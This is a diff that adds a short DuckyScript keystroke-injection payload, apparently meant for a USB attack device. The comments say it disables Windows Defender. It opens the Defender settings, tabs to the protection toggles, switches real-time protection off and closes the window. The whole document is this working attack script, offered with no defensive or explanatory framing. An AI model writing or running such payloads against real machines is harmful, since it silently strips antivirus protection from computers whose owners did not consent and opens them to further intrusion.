@@ -1,0 +1,21 @@
+REM Disables Windows Defender
+REM Open Defender settings
+DEFAULT_DELAY 400
+CTRL ESC
+STRING defender
+ENTER
+ENTER
+TAB
+TAB
+TAB
+TAB
+ENTER
+REM Disable protection
+SPACE
+TAB
+TAB
+TAB
+TAB
+SPACE
+REM Clean up
+ALT F4
